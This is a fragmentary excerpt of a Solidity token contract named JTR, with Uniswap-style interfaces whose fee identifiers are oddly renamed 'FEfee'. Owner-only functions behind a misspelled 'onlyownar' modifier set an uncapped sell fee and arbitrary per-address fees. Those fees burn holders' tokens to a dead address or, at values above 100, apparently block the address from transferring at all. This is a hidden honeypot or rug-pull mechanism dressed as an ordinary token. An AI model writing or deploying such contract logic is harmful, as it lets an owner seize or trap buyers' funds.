...
interface IUniswapV2Factory {
    ...
    function FEfeeTo() external view returns (address);
    function FEfeeToSetter() external view returns (address);
    ...
    function setFEfeeTo(address) external;
    function setFEfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFEfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingFEfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingFEfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingFEfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFEfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract JTR is BEP20, Ownable {
    ...
    uint256 private _defaultSellFEfee = 0;

    uint256 private _defaultBuyFEfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFEfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellFEfee = _value;
    }

    function setSlipFEfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFEfee[_address] = _value;
    }

    function getSlipFEfee(address _address) external view onlyownar returns (uint256) {
        return _slipFEfee[_address];
    }


    function setMAccountFEfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountFEfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeFEfeeAmount = 0;

        if (rF) {
            uint256 tradeFEfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFEfee = _defaultSellFEfee;
                }
                if (from == uniswapV2Pair) {

                    tradeFEfee = _defaultBuyFEfee;
                }
            }
            if (_slipFEfee[from] > 0) {
                tradeFEfee = _slipFEfee[from];
            }

            tradeFEfeeAmount = _Amount.mul(tradeFEfee).div(100);
        }


        if (tradeFEfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeFEfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFEfeeAmount);
            emit Transfer(from, _deadAddress, tradeFEfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeFEfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeFEfeeAmount);
        emit Transfer(from, _to, _Amount - tradeFEfeeAmount);
    }
